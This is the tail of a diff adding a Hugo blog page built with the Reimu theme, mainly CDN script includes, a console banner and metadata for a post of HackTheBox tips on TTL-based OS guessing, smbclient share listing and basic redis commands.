+      }
+    }
+  }
+</script><script
+    src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js"
+    defer
+    
+    
+    onload="setupFirework()"
+    integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8&#43;pUoWX8n1rgq282T" crossorigin="anonymous"></script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "L",
+          title: "htb-trick",
+          url: "https:\/\/test692618.github.io\/post\/htb-trick\/htb-trick\/",
+          description: " TTL值判断操作系统 对比TTL值与操作系统默认值 不同操作系统的默认TTL值如下： Windows: 默认TTL为128 Linux\/Unix: 默认TTL为64 macOS: 默认TTL为64 网络设备（如路由器）: 通常为255 smbclient使用注意 smbclient -L X.X.X.X -U [USER] 列出主机目录 smbclient \u0026#39;\\\\\\\\X.X.X.X\\\\Dir\u0026#39; -U [USER] 进入目录\tredis基础命令 redis info 详情 select 0-15 选择库 keys * 查询键 get key 查询键值 字典推荐 sudo apt …",
+          cover: "https:\/\/test692618.github.io\/images\/banner.webp",
+        };
+      </script><script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax ></script><script src="/js/tabs.js" integrity="" crossorigin="anonymous" data-pjax defer></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+        }
+        pswp()
+      </script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    
+    async
+    
+    
+    integrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
